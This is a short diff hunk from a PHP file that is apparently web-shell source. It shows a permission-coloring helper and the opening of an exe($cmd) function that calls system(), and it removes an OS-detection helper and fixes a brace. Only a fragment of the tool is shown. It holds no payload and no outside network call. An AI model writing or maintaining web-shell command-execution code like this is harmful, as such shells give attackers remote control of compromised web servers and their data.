@@ -603,9 +603,7 @@ function r($dir,$perm) {
 		return "<font color=red>".$perm."</font>";
 	} else {
 		return "<font color=blue>".$perm."</font>";
-}
-function OS() {
-	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
+	}
 }
 function exe($cmd) {
 	if(function_exists('system')) { 		
